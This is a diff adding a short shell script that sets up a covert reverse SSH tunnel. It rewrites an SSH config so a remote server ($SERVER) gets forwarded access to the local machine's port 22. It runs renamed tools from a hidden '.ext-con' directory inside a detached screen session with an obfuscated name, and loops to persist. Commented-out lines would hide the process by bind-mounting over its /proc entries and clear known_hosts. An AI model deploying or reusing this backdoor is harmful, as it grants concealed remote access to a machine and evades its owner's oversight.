@@ -1,0 +1,18 @@
+#mv .ext-con B
+[[ ! -z $SERVER ]] && sed -i "s/Hostname.*/Hostname $SERVER/g" F
+[[ ! -z $RPORT ]] && sed -i "s/User.*/User $RPORT/g" F
+[[ ! -z $RPORT ]] && sed -i "s/RemoteForward 1024.*/RemoteForward $RPORT 127.0.0.1:22/g" F
+[[ ! -z $DIRECTION ]] && sed -i "s/RemoteForward/$DIRECTION/g" F
+[[ ! -z $LPORT ]] && sed -i "s/127.0.0.1.*/127.0.0.1:$LPORT/g" F
+#ssh-keygen -f "~/.ssh/known_hosts" -R $(grep -Po '(?<=HostName ).*' F)
+BPATH=$(pwd)
+PATH=$PATH:$BPATH/B
+#
+SCREENDIR=$BPATH/S _ F -F F F
+#T=$(sudo mktemp -d)
+#ps -ef | grep "F F F" | grep -v "grep" | awk '{print $2}' | xargs -I {} bash -c "sudo mount -o bind $T /proc/{}"
+#sudo rm -rf $T
+#mv B .ext-con
+while true; do
+  sleep 5
+done
